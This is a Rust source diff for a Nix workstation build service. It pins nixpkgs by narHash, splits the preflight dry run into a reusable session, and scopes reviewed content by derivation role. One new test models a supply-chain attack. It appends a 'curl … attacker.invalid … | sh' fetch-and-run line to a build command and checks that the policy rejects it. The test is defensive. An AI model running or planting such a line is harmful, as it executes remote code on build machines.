@@ -684,7 +684,15 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
     }
 
     if let Some(source) = spec.closure_source.clone() {
-        return execute_replica_copy(state, &job, &spec, &target, &source).await;
+        return execute_replica_copy(
+            state,
+            &job,
+            &spec,
+            &target,
+            &source,
+            detected.as_ref().map(|ready| ready.nar_hash.as_str()),
+        )
+        .await;
     }
     let command = nix_build_command_with_nixpkgs_nar_hash(
         &state.config,
@@ -854,7 +862,9 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                 .await?;
                 return Ok(());
             }
-            let software_inventory = evaluate_software_inventory(&state.config, &spec).await;
+            let nixpkgs_nar_hash = detected.as_ref().map(|ready| ready.nar_hash.as_str());
+            let software_inventory =
+                evaluate_software_inventory(&state.config, &spec, nixpkgs_nar_hash).await;
             db::update_build_job_progress(
                 &state.db,
                 job.id,
@@ -899,7 +909,14 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
             };
             merge_build_metadata(
                 &mut cached.metadata,
-                &success_result_metadata(&state.config, &job, &target, &spec, &software_inventory),
+                &success_result_metadata(
+                    &state.config,
+                    &job,
+                    &target,
+                    &spec,
+                    &software_inventory,
+                    nixpkgs_nar_hash,
+                ),
             );
             db::update_build_job_progress(
                 &state.db,
@@ -933,6 +950,7 @@ async fn execute_claimed_job(state: &AppState, job: BuildJob) -> Result<()> {
                     &target,
                     &spec,
                     &software_inventory,
+                    nixpkgs_nar_hash,
                 )),
             )
             .await?;
@@ -1013,6 +1031,7 @@ async fn execute_replica_copy(
     spec: &ValidatedBuildSpec,
     target: &BuildTargetConfig,
     source: &ValidatedClosureSource,
+    nixpkgs_nar_hash: Option<&str>,
 ) -> Result<()> {
     db::update_build_job_progress(
         &state.db,
@@ -1092,10 +1111,18 @@ async fn execute_replica_copy(
         "Verified mirrored closure in Nest cache",
     )
     .await?;
-    let software_inventory = evaluate_software_inventory(&state.config, spec).await;
+    let software_inventory =
+        evaluate_software_inventory(&state.config, spec, nixpkgs_nar_hash).await;
     merge_build_metadata(
         &mut cached.metadata,
-        &success_result_metadata(&state.config, job, target, spec, &software_inventory),
+        &success_result_metadata(
+            &state.config,
+            job,
+            target,
+            spec,
+            &software_inventory,
+            nixpkgs_nar_hash,
+        ),
     );
     db::update_build_job_progress(
         &state.db,
@@ -1126,6 +1153,7 @@ async fn execute_replica_copy(
             target,
             spec,
             &software_inventory,
+            nixpkgs_nar_hash,
         )),
     )
     .await?;
@@ -1925,6 +1953,7 @@ fn build_target<'a>(
     build_target_for_detected_commit(config, spec, None)
 }
 
+#[cfg(test)]
 fn build_target_for_detected_commit<'a>(
     config: &'a AppConfig,
     spec: &ValidatedBuildSpec,
@@ -2485,36 +2514,95 @@ pub(crate) async fn unadmitted_local_derivations(
     command: &NixBuildCommand,
     profile: &WorkstationBuildProfile,
 ) -> Result<UnadmittedDerivations> {
-    tokio::fs::create_dir_all(&config.build.work_dir)
-        .await
-        .with_context(|| {
-            format!(
-                "create build work directory {}",
-                config.build.work_dir.display()
-            )
-        })?;
-    let mut store_nonce = [0u8; 16];
-    OsRng.fill_bytes(&mut store_nonce);
-    let store_root = config
-        .build
-        .work_dir
-        .join(format!("source-policy-store-{}", hex::encode(store_nonce)));
-    tokio::fs::create_dir(&store_root)
-        .await
-        .with_context(|| format!("create isolated preflight store {}", store_root.display()))?;
-    let result = preflight_unadmitted_in_store(
-        config,
-        command,
-        profile,
-        &store_root,
-        PreflightLimits::default(),
-    )
-    .await;
-    let cleanup = remove_source_policy_store(&store_root).await;
+    let session = DryRunSession::start(config, command).await?;
+    let result = session.classify(profile).await;
+    let cleanup = session.finish().await;
     match (result, cleanup) {
         (Ok(value), Ok(())) => Ok(value),
-        (Err(error), _) => Err(error),
-        (Ok(_), Err(error)) => Err(error),
+        (Err(error), _) | (Ok(_), Err(error)) => Err(error),
+    }
+}
+
+/// One dry run kept in its isolated store, so the detected-commit check can
+/// classify a single evaluation with several profiles. `finish` removes the
+/// store; dropping an unfinished session removes it synchronously.
+pub(crate) struct DryRunSession {
+    store_root: PathBuf,
+    program: String,
+    graph: DryRunGraph,
+    finished: bool,
+}
+
+impl DryRunSession {
+    pub(crate) async fn start(config: &AppConfig, command: &NixBuildCommand) -> Result<Self> {
+        tokio::fs::create_dir_all(&config.build.work_dir)
+            .await
+            .with_context(|| {
+                format!(
+                    "create build work directory {}",
+                    config.build.work_dir.display()
+                )
+            })?;
+        let mut store_nonce = [0u8; 16];
+        OsRng.fill_bytes(&mut store_nonce);
+        let store_root = config
+            .build
+            .work_dir
+            .join(format!("source-policy-store-{}", hex::encode(store_nonce)));
+        tokio::fs::create_dir(&store_root)
+            .await
+            .with_context(|| format!("create isolated preflight store {}", store_root.display()))?;
+        let mut session = Self {
+            store_root,
+            program: command.program.clone(),
+            graph: DryRunGraph::default(),
+            finished: false,
+        };
+        match dry_run_graph_in_store(
+            config,
+            command,
+            &session.store_root,
+            PreflightLimits::default(),
+        )
+        .await
+        {
+            Ok(graph) => {
+                session.graph = graph;
+                Ok(session)
+            }
+            Err(error) => {
+                let _ = session.finish().await;
+                Err(error)
+            }
+        }
+    }
+
+    pub(crate) async fn classify(
+        &self,
+        profile: &WorkstationBuildProfile,
+    ) -> Result<UnadmittedDerivations> {
+        classify_graph_in_store(
+            &self.graph,
+            &self.program,
+            profile,
+            &self.store_root,
+            PreflightLimits::default(),
+        )
+        .await
+    }
+
+    pub(crate) async fn finish(mut self) -> Result<()> {
+        self.finished = true;
+        remove_source_policy_store(&self.store_root).await
+    }
+}
+
+impl Drop for DryRunSession {
+    fn drop(&mut self) {
+        if !self.finished {
+            let _ = make_source_policy_directories_owner_writable(&self.store_root);
+            let _ = fs::remove_dir_all(&self.store_root);
+        }
     }
 }
 
@@ -2525,6 +2613,24 @@ async fn preflight_unadmitted_in_store(
     store_root: &Path,
     limits: PreflightLimits,
 ) -> Result<UnadmittedDerivations> {
+    let graph = dry_run_graph_in_store(config, command, store_root, limits).await?;
+    classify_graph_in_store(&graph, &command.program, profile, store_root, limits).await
+}
+
+/// The local work a dry run lists in an isolated store, with the `nix
+/// derivation show` record of each derivation and signed seeds removed.
+#[derive(Clone, Debug, Default)]
+pub(crate) struct DryRunGraph {
+    would_build: Vec<String>,
+    derivations: BTreeMap<String, Value>,
+}
+
+async fn dry_run_graph_in_store(
+    config: &AppConfig,
+    command: &NixBuildCommand,
+    store_root: &Path,
+    limits: PreflightLimits,
+) -> Result<DryRunGraph> {
     let store_url = format!("local?root={}", store_root.display());
     let mut args = vec!["--store".to_string(), store_url.clone()];
     // `nix build --dry-run` may execute import-from-derivation dependencies
@@ -2581,12 +2687,9 @@ async fn preflight_unadmitted_in_store(
     }
     let would_build = parsed.paths;
     if would_build.is_empty() {
-        return Ok(UnadmittedDerivations {
+        return Ok(DryRunGraph {
             would_build: Vec::new(),
-            paths: Vec::new(),
-            rejected_on_their_own: Vec::new(),
             derivations: BTreeMap::new(),
-            changed_builder_files: BTreeSet::new(),
         });
     }
     let mut derivations = BTreeMap::<String, Value>::new();
@@ -2673,6 +2776,23 @@ async fn preflight_unadmitted_in_store(
             })
         })
         .collect::<Vec<_>>();
+    Ok(DryRunGraph {
+        would_build,
+        derivations,
+    })
+}
+
+/// Classify a dry run's local work with `profile`, in the store it ran in.
+async fn classify_graph_in_store(
+    graph: &DryRunGraph,
+    program: &str,
+    profile: &WorkstationBuildProfile,
+    store_root: &Path,
+    limits: PreflightLimits,
+) -> Result<UnadmittedDerivations> {
+    let store_url = format!("local?root={}", store_root.display());
+    let would_build = graph.would_build.clone();
+    let derivations = graph.derivations.clone();
     let would_build_set = would_build.iter().cloned().collect::<HashSet<_>>();
 
     // A substituted buildEnv helper is not downloaded by --dry-run. Its bytes
@@ -2688,16 +2808,9 @@ async fn preflight_unadmitted_in_store(
                     && input.output == TRUSTED_LINK_FARM_BUILDER.output
             })
         })
-        && !reviewed_source_matches(
-            profile,
-            &|path: &str, expected: &str| {
-                isolated_store_source_matches_sha256(store_root, path, expected)
-            },
-            &link_farm_builder,
-            TRUSTED_LINK_FARM_BUILDER_SHA256,
-        )
+        && !link_farm_builder_is_reviewed(profile, store_root, &link_farm_builder)
     {
-        let mut fetch = crate::nix_command::tokio_command(&command.program);
+        let mut fetch = crate::nix_command::tokio_command(program);
         fetch.args([
             "--store",
             &store_url,
@@ -2728,14 +2841,7 @@ async fn preflight_unadmitted_in_store(
         )
         .await?;
         if !output.status.success()
-            || !reviewed_source_matches(
-                profile,
-                &|path: &str, expected: &str| {
-                    isolated_store_source_matches_sha256(store_root, path, expected)
-                },
-                &link_farm_builder,
-                TRUSTED_LINK_FARM_BUILDER_SHA256,
-            )
+            || !link_farm_builder_is_reviewed(profile, store_root, &link_farm_builder)
         {
             bail!("signed substitute for the pinned buildEnv helper could not be verified");
         }
@@ -3010,6 +3116,18 @@ where
     )
 }
 
+/// The fetched buildEnv helper has the pin's bytes or a counterpart's (in
+/// any role; each link farm using it is then checked in its own role).
+fn link_farm_builder_is_reviewed(
+    profile: &WorkstationBuildProfile,
+    store_root: &Path,
+    path: &str,
+) -> bool {
+    std::iter::once(TRUSTED_LINK_FARM_BUILDER_SHA256)
+        .chain(profile.any_builder_file_counterparts(TRUSTED_LINK_FARM_BUILDER_SHA256))
+        .any(|expected| isolated_store_source_matches_sha256(store_root, path, expected))
+}
+
 /// A reviewed builder file: the pin's bytes, or at a detected commit the
 /// changed bytes one of its counterparts uses.
 fn reviewed_source_matches<F>(
@@ -3038,6 +3156,9 @@ fn derivation_is_exempt_for_profile<F>(
 where
     F: Fn(&str, &str) -> bool,
 {
+    // Only the counterpart content of this derivation's role applies.
+    let scoped = profile.for_derivation(drv_path);
+    let profile = &scoped;
     let reviewed_source = |path: &str, expected: &str| {
         reviewed_source_matches(profile, verify_source, path, expected)
     };
@@ -5904,6 +6025,7 @@ fn success_result_metadata(
     target: &BuildTargetConfig,
     spec: &ValidatedBuildSpec,
     software_inventory: &Value,
+    nixpkgs_nar_hash: Option<&str>,
 ) -> Value {
     let mut metadata = build_result_metadata(config, job, Some(target), None);
     let Some(object) = metadata.as_object_mut() else {
@@ -5940,9 +6062,13 @@ fn success_result_metadata(
     object.insert("cache".to_string(), json!("exported"));
     if let Some(commit) = spec.nixpkgs_commit.as_deref() {
         object.insert("nixpkgs_revision".to_string(), json!(commit));
+        // The fetched source: narHash-pinned at a detected commit.
         object.insert(
             "nixpkgs_flake".to_string(),
-            json!(format!("github:NixOS/nixpkgs/{commit}")),
+            json!(
+                nixpkgs_flake_ref(commit, nixpkgs_nar_hash)
+                    .unwrap_or_else(|_| format!("github:NixOS/nixpkgs/{commit}"))
+            ),
         );
     }
     object.insert(
@@ -5978,16 +6104,41 @@ fn software_inventory_eval_args(installable: &str, allow_source_builds: bool) ->
     args
 }
 
-async fn evaluate_software_inventory(config: &AppConfig, spec: &ValidatedBuildSpec) -> Value {
-    evaluate_software_inventory_with_limits(config, spec, SoftwareInventoryLimits::default()).await
+async fn evaluate_software_inventory(
+    config: &AppConfig,
+    spec: &ValidatedBuildSpec,
+    nixpkgs_nar_hash: Option<&str>,
+) -> Value {
+    evaluate_software_inventory_pinned(
+        config,
+        spec,
+        nixpkgs_nar_hash,
+        SoftwareInventoryLimits::default(),
+    )
+    .await
 }
 
+#[cfg(test)]
 async fn evaluate_software_inventory_with_limits(
     config: &AppConfig,
     spec: &ValidatedBuildSpec,
     limits: SoftwareInventoryLimits,
 ) -> Value {
+    evaluate_software_inventory_pinned(config, spec, None, limits).await
+}
+
+/// Probe package versions at the job's commit, from the narHash-pinned
+/// source at a detected commit.
+async fn evaluate_software_inventory_pinned(
+    config: &AppConfig,
+    spec: &ValidatedBuildSpec,
+    nixpkgs_nar_hash: Option<&str>,
+    limits: SoftwareInventoryLimits,
+) -> Value {
     let Some(commit) = spec.nixpkgs_commit.as_deref() else {
+        return json!([]);
+    };
+    let Ok(nixpkgs) = nixpkgs_flake_ref(commit, nixpkgs_nar_hash) else {
         return json!([]);
     };
     let mut refs = vec![(
@@ -6007,7 +6158,7 @@ async fn evaluate_software_inventory_with_limits(
             break;
         }
         let installable = format!(
-            "github:NixOS/nixpkgs/{commit}#legacyPackages.{}.{}.version",
+            "{nixpkgs}#legacyPackages.{}.{}.version",
             spec.system, package_ref
         );
         let mut command = crate::nix_command::tokio_command(&config.build.nix_binary);
@@ -6062,6 +6213,7 @@ fn merge_build_metadata(destination: &mut Value, source: &Value) {
     }
 }
 
+#[cfg(test)]
 fn nix_build_command(
     config: &AppConfig,
     target: &BuildTargetConfig,
@@ -6449,86 +6601,12 @@ fn nest_nixos_flake(
     )
 }
 
-/// The Blueprints this Nest built at its release pin, prepared again at a
-/// detected commit with only nixpkgs changed: the newest succeeded
-/// source-disabled job of each Blueprint (at most `limit`), with its exact
-/// generated Nix, desktop module and wallpaper. Job inputs are written below
-/// `work`. These configurations passed the preflight at the pin, so at the
-/// detected commit they may differ only in commit identities.
-pub(crate) async fn retained_blueprint_commands(
-    config: &AppConfig,
-    db: &sqlx::SqlitePool,
-    work: &Path,
-    commit: &str,
-    nar_hash: &str,
-    limit: usize,
-) -> Result<Vec<ReferenceJob>> {
-    let pins = crate::config::workstation_nixpkgs_commits(config);
-    let mut ids = Vec::new();
-    for pin in &pins {
-        ids.extend(
-            sqlx::query_scalar::<_, i64>(
-                "SELECT MAX(id) FROM nest_build_jobs
-                 WHERE status = 'succeeded' AND json_valid(build_spec)
-                   AND json_extract(build_spec, '$.build_input.kind')
-                       IN ('blueprint_nixos_module', 'desktop_experience_nixos_module')
-                   AND json_extract(build_spec, '$.nixpkgs_commit') = ?
-                   AND COALESCE(json_extract(build_spec, '$.allow_source_builds'), 0) = 0
-                 GROUP BY COALESCE(
-                     json_extract(build_spec, '$.blueprint_id'),
-                     json_extract(build_spec, '$.input_revision')
-                 )
-                 ORDER BY MAX(id) DESC
-                 LIMIT ?",
-            )
-            .bind(pin)
-            .bind(i64::try_from(limit).unwrap_or(i64::MAX))
-            .fetch_all(db)
-            .await?,
-        );
-    }
-    ids.sort_unstable_by(|left, right| right.cmp(left));
-    ids.truncate(limit);
-    let mut pin_config = config.clone();
-    pin_config.build.work_dir = work.join("pin-jobs");
-    pin_config.build.output_dir = work.join("pin-out");
-    let mut job_config = config.clone();
-    job_config.build.work_dir = work.join("jobs");
-    job_config.build.output_dir = work.join("out");
-    let mut jobs = Vec::new();
-    for id in ids {
-        let job = db::get_build_job(db, id).await?;
-        let mut spec = validate_build_spec(config, &job)
-            .with_context(|| format!("retained Blueprint job {id}"))?;
-        let pin_target = build_target_for_detected_commit(config, &spec, None)?;
-        let pin = nix_build_command(&pin_config, pin_target, &spec, id)
-            .with_context(|| format!("prepare retained Blueprint job {id} at the pin"))?;
-        spec.nixpkgs_commit = Some(commit.to_string());
-        let target = build_target_for_detected_commit(config, &spec, Some(commit))?;
-        let detected =
-            nix_build_command_with_nixpkgs_nar_hash(&job_config, target, &spec, id, Some(nar_hash))
-                .with_context(|| format!("prepare retained Blueprint job {id}"))?;
-        jobs.push(ReferenceJob {
-            label: format!("blueprint job {id}"),
-            pin,
-            detected,
-        });
-    }
-    Ok(jobs)
-}
-
-/// One reference job of a detected-commit check: the same inputs at the pin
-/// and at the detected commit.
-pub(crate) struct ReferenceJob {
-    pub(crate) label: String,
-    pub(crate) pin: NixBuildCommand,
-    pub(crate) detected: NixBuildCommand,
-}
-
 /// The Nest configuration and option shim of a Blueprint job with a desktop
 /// module (`./tiaris-blueprints.nix` and `./blueprint.nix` are the caller's),
-/// for the detected-commit check's built-in Blueprint dry runs.
-pub(crate) fn blueprint_job_template_files() -> [(&'static str, String); 2] {
+/// and the same configuration as a function of a reference's desktop module
+/// and generated Blueprint (`reference-configuration.nix`), for the
+/// detected-commit check's dry runs.
+pub(crate) fn blueprint_job_template_files() -> Result<[(&'static str, String); 3]> {
     let input = ValidatedBlueprintBuildInput {
         kind: BLUEPRINT_BUILD_INPUT_KIND.to_string(),
         generated_nix: String::new(),
@@ -6542,13 +6620,23 @@ pub(crate) fn blueprint_job_template_files() -> [(&'static str, String); 2] {
         installer_target: None,
         wallpaper_asset: None,
     };
-    [
-        ("configuration.nix", nest_nixos_configuration(&input)),
+    let configuration = nest_nixos_configuration(&input);
+    let imports = "    ./tiaris-blueprints.nix\n    ./blueprint.nix\n";
+    if configuration.matches(imports).count() != 1 {
+        bail!("the Blueprint job configuration no longer imports its desktop module and Blueprint");
+    }
+    let reference = format!(
+        "{{ desktop, blueprint }}:\n\n{}",
+        configuration.replace(imports, "    desktop\n    blueprint\n")
+    );
+    Ok([
+        ("configuration.nix", configuration),
+        ("reference-configuration.nix", reference),
         (
             "tiaris-compat-options.nix",
             blueprint_compat_module(true).to_string(),
         ),
-    ]
+    ])
 }
 
 fn nest_nixos_configuration(build_input: &ValidatedBlueprintBuildInput) -> String {
@@ -12764,7 +12852,13 @@ esac
         add_counterparts(&base, &files, &pin, &detected, &mut counterparts);
         assert_eq!(
             counterparts.builder_files,
-            BTreeMap::from([("wrapper.c".to_string(), changed_sha256.clone())])
+            BTreeMap::from([(
+                (
+                    "security-wrapper-Hyprland-x86_64-unknown-linux-musl".to_string(),
+                    "wrapper.c".to_string()
+                ),
+                changed_sha256.clone()
+            )])
         );
         let profile = base
             .clone()
@@ -12846,42 +12940,68 @@ esac
     }
 
     #[test]
-    fn counterpart_content_must_be_well_formed_and_unambiguous() {
-        use profile::{FingerprintCounterpart, StockCommandCounterpart};
+    fn counterpart_content_must_be_well_formed_and_applies_only_to_its_role() {
+        use profile::{BuilderFileCounterpart, FingerprintCounterpart, StockCommandCounterpart};
         let (base, _) = shifted_detected_profile(BTreeSet::new());
-        let pair = |commit: &str, reviewed: &str| FingerprintCounterpart {
+        let pair = |role: &str, commit: &str, reviewed: &str| FingerprintCounterpart {
+            role: role.to_string(),
             commit: [commit.repeat(64), commit.repeat(64)],
             reviewed: [reviewed.repeat(64), reviewed.repeat(64)],
         };
         let valid = ReviewedContent {
-            fingerprints: vec![pair("a", "b")],
+            fingerprints: vec![pair("system-units", "a", "b")],
             stock_commands: vec![StockCommandCounterpart {
+                role: "system-units".to_string(),
                 commit: "new writeText command".to_string(),
                 reviewed: STOCK_WRITE_TEXT_COMMAND.to_string(),
             }],
-            builder_files: BTreeMap::from([("wrapper.c".to_string(), "c".repeat(64))]),
+            builder_files: vec![BuilderFileCounterpart {
+                role: "system-units".to_string(),
+                file: "wrapper.c".to_string(),
+                sha256: "c".repeat(64),
+            }],
         };
         let profile = base.clone().with_reviewed_content(&valid).unwrap();
+        let units =
+            profile.for_derivation("/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-system-units.drv");
+        let etc = profile.for_derivation("/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-etc.drv");
         assert_eq!(
-            profile.fingerprints("x"),
-            WorkstationBuildProfile::builtin().fingerprints("x")
-        );
-        assert_eq!(
-            profile.stock_command("new writeText command"),
+            units.stock_command("new writeText command"),
             STOCK_WRITE_TEXT_COMMAND
         );
         assert_eq!(
-            profile.builder_file_counterpart(TRUSTED_SECURITY_WRAPPER_SHA256),
+            units.builder_file_counterpart(TRUSTED_SECURITY_WRAPPER_SHA256),
             Some("c".repeat(64).as_str())
         );
         assert_eq!(
-            profile.builder_file_counterpart(TRUSTED_STDENV_SOURCE_SHA256),
+            units.builder_file_counterpart(TRUSTED_STDENV_SOURCE_SHA256),
             None
         );
+        // Another role, or no role, gets none of it.
+        for other in [&etc, &profile] {
+            assert_eq!(
+                other.stock_command("new writeText command"),
+                "new writeText command"
+            );
+            assert_eq!(
+                other.builder_file_counterpart(TRUSTED_SECURITY_WRAPPER_SHA256),
+                None
+            );
+        }
 
         let mut conflicting = valid.clone();
-        conflicting.fingerprints.push(pair("a", "d"));
+        conflicting
+            .fingerprints
+            .push(pair("system-units", "a", "d"));
         assert!(base.clone().with_reviewed_content(&conflicting).is_err());
+        // The same commit script may replace different pin scripts in two
+        // roles.
+        let mut two_roles = valid.clone();
+        two_roles.fingerprints.push(pair("etc", "a", "d"));
+        assert!(base.clone().with_reviewed_content(&two_roles).is_ok());
+        let mut no_role = valid.clone();
+        no_role.fingerprints[0].role = String::new();
+        assert!(base.clone().with_reviewed_content(&no_role).is_err());
         let mut short = valid.clone();
         short.fingerprints[0].commit[1] = "a".repeat(63);
         assert!(base.clone().with_reviewed_content(&short).is_err());
@@ -12889,7 +13009,7 @@ esac
         not_stock.stock_commands[0].reviewed = "gcc source.c".to_string();
         assert!(base.clone().with_reviewed_content(&not_stock).is_err());
         let mut unknown_file = valid.clone();
-        unknown_file.builder_files = BTreeMap::from([("setup.sh".to_string(), "c".repeat(64))]);
+        unknown_file.builder_files[0].file = "setup.sh".to_string();
         assert!(base.clone().with_reviewed_content(&unknown_file).is_err());
         assert!(
             WorkstationBuildProfile::builtin()
@@ -13092,6 +13212,83 @@ esac
         assert_eq!(admitted.nixpkgs_commit, None);
         assert!(
             WorkstationBuildProfile::for_build(admitted.nixpkgs_commit.as_deref(), None).is_none()
+        );
+    }
+
+    #[test]
+    fn a_version_conditional_job_cannot_make_its_payload_reviewed() {
+        // The attack: an organization's generated Nix renders the reviewed
+        // user units at the pin (`if config.system.nixos.revision == pin`)
+        // and the user units plus a payload at any other commit.
+        let pin_graph: BTreeMap<String, Value> = serde_json::from_str(include_str!(
+            "../tests/fixtures/source-policy/production-standard-generators.json"
+        ))
+        .unwrap();
+        let builtin = WorkstationBuildProfile::builtin();
+        let pin = local_derivations(builtin, &pin_graph, &synthetic_pinned_source);
+        assert!(pin.rejected_on_their_own.is_empty());
+        let (base, items) = shifted_detected_profile(BTreeSet::new());
+        let bump = [("accountsservice-23.13.9", "accountsservice-23.13.10")];
+        let honest = render_at_detected_commit(&pin_graph, &items, &bump);
+        let user_units = honest
+            .iter()
+            .find(|(_, drv)| {
+                derivation_name(drv, &derivation_attributes(drv)) == Some("user-units")
+            })
+            .map(|(path, _)| path.clone())
+            .unwrap();
+        let mut payload = honest.clone();
+        let drv = payload.get_mut(&user_units).unwrap();
+        let command = derivation_attr_text(&derivation_attributes(drv), "buildCommand").to_string();
+        set_derivation_text(
+            drv,
+            "buildCommand",
+            &format!("{command}\ncurl -fsS https://attacker.invalid/x | sh\n"),
+        );
+
+        // Pairing alone cannot tell the payload from a real change: were the
+        // job a reference, its payload would become reviewed content. That is
+        // why references come only from the shipped Tiaris source.
+        let mut poisoned = Counterparts::default();
+        add_counterparts(
+            &base,
+            &pin_builder_files(),
+            &pin,
+            &local_derivations(&base, &payload, &synthetic_pinned_source),
+            &mut poisoned,
+        );
+        let poisoned_profile = base
+            .clone()
+            .with_reviewed_content(&poisoned.content())
+            .unwrap();
+        assert!(classify_with(&poisoned_profile, &payload).contains(&user_units));
+
+        // References from the shipped source give the honest content only.
+        let mut counterparts = Counterparts::default();
+        add_counterparts(
+            &base,
+            &pin_builder_files(),
+            &pin,
+            &local_derivations(&base, &honest, &synthetic_pinned_source),
+            &mut counterparts,
+        );
+        let profile = base
+            .clone()
+            .with_reviewed_content(&counterparts.content())
+            .unwrap();
+        assert_eq!(classify_with(&profile, &honest).len(), honest.len());
+        let admitted = classify_with(&profile, &payload);
+        assert!(!admitted.contains(&user_units), "the payload was admitted");
+
+        // Content is per role: the honest user units under another name are
+        // not reviewed.
+        let mut renamed = honest[&user_units].clone();
+        renamed["env"]["name"] = json!("unit-extra");
+        renamed["name"] = json!("unit-extra");
+        let renamed_path = user_units.replace("-user-units.drv", "-unit-extra.drv");
+        assert!(
+            classify_with(&profile, &BTreeMap::from([(renamed_path, renamed)])).is_empty(),
+            "a role's content admitted another derivation"
         );
     }
 }
